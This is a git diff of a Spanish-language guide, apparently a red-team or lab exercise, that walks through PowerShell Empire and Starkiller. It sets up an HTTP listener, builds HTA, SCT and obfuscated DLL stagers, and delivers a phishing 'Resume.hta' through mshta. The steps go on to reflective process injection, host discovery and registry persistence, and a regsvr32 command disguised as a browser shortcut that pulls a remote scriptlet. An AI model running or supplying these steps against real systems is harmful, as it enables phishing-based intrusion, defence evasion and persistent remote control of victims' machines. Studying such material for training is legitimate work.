@@ -50,58 +50,58 @@ El resultado debe ser el siguiente:
 
 ## Instalación Starkiller
 1. Instalar Starkiller para tener GUI
->cd /opt
->sudo wget https://github.com/BC-SECURITY/Starkiller/releases/download/v1.0.0/starkiller-1.0.0.AppImage
->sudo chmod +x starkiller-1.0.0.AppImage
+> cd /opt
+> sudo wget https://github.com/BC-SECURITY/Starkiller/releases/download/v1.0.0/starkiller-1.0.0.AppImage
+> sudo chmod +x starkiller-1.0.0.AppImage
 
 ![image](https://i.imgur.com/rFlVBTU.jpg)
 
 ## Inicializar Starkiller (GUI)
 1. Iniciar Starkiller
->cd /opt/starkiller
->./starkiller-1.0.0.AppImage
+> cd /opt/starkiller
+> ./starkiller-1.0.0.AppImage
 
 ![image](https://i.imgur.com/UfK06Mk.jpg)
 
 ## Creación de componentes PowerShell Empire
 1.Crear Listener
->Type: http
->Name: http
->Host: http://10.0.0.187
->Port: 80
->BindIP: 10.0.0.187
->Jitter: 0.5
->StagingKey: empireadmin
+> Type: http
+> Name: http
+> Host: http://10.0.0.187
+> Port: 80
+> BindIP: 10.0.0.187
+> Jitter: 0.5
+> StagingKey: empireadmin
 
 ![image](https://i.imgur.com/uqNHCBy.jpg)
 
 2.Crear Stagers
 -Generar Stager HTA:
 Type: windows/hta
->Listner: http
->Base64: True
->Language: powershell
->Outfile: /tmp/Resume.hta
+> Listner: http
+> Base64: True
+> Language: powershell
+> Outfile: /tmp/Resume.hta
 -Generar Stager SCT:
->Type: windows/launcher_sct
->Listner: http
->Base64: True
->Language: powershell
+> Type: windows/launcher_sct
+> Listner: http
+> Base64: True
+> Language: powershell
 -Generar Stager DLL:
->Type: windows/dll
->Listner: http
->Arch: x86
->Language: powershell
->OutFile: /tmp/launcher.dll
->Obfuscate: True
->ObfuscateCommand: Token\String\1
+> Type: windows/dll
+> Listner: http
+> Arch: x86
+> Language: powershell
+> OutFile: /tmp/launcher.dll
+> Obfuscate: True
+> ObfuscateCommand: Token\String\1
 
 Resultado de la creación de Stagers:
 ![image](https://i.imgur.com/htm5bqB.jpg)
 
 3.Descargar Stagers en /tmp y usarlos con SimpleHTTPServer
->cd /tmp
->python -m SimpleHTTPServer 8080
+> cd /tmp
+> python -m SimpleHTTPServer 8080
 
 ![image](https://i.imgur.com/JurGJ9P.jpg)
 
@@ -111,15 +111,15 @@ Enviamos un link de descarga o mail http://192.168.126.129/Resume.hta
 
 2. Ejecución
 -Ejecutar Resume.hta
->mshta http://10.0.0.187:8080/Resume.hta
+> mshta http://10.0.0.187:8080/Resume.hta
 
 ![image](https://i.imgur.com/lZCeoZq.jpg)
 
 -Migrar a otro proceso con reflective PE Injection
->ver procesos: ps
->usemodule code_execution/invoke_reflectivepeinjection
->set ProcID: <processID>
->set DllPath: /tmp/launcher.dll
+> ver procesos: ps
+> usemodule code_execution/invoke_reflectivepeinjection
+> set ProcID: <processID>
+> set DllPath: /tmp/launcher.dll
 
 ![image](https://i.imgur.com/Ap8ghR1.jpg)
   
@@ -127,21 +127,21 @@ Enviamos un link de descarga o mail http://192.168.126.129/Resume.hta
 ![image](https://i.imgur.com/9Q5JA25.jpg)
   
 4. Descubrimiento
->whoami
->usemodule situational_awareness/host/antivirusproduct 
->usemodule situational_awareness/host/get_uaclevel 
->usemodule situational_awareness/host/winenum
+> whoami
+> usemodule situational_awareness/host/antivirusproduct 
+> usemodule situational_awareness/host/get_uaclevel 
+> usemodule situational_awareness/host/winenum
 
 ![image](https://i.imgur.com/8DjskSO.jpg)
 5. Persistencia
->usemodule persistence/userland/registry
->set Listener: http
+> usemodule persistence/userland/registry
+> set Listener: http
 
 ![image](https://i.imgur.com/loz2sRu.jpg)
 
 6. Evasión de defensa
 -Ejecución con regsvr32 y scripting. Se crea un acceso directo enmascarango un navegador web con target:
->C:\Windows\System32\cmd.exe /c "C:\Windows\System32\regsvr32.exe /s /n /u /i:http:\192.168.126.129:8080\launcher.sct scrobj.dll"
+> C:\Windows\System32\cmd.exe /c "C:\Windows\System32\regsvr32.exe /s /n /u /i:http:\192.168.126.129:8080\launcher.sct scrobj.dll"
 
 ![image](https://i.imgur.com/maJN0cy.jpg)
 
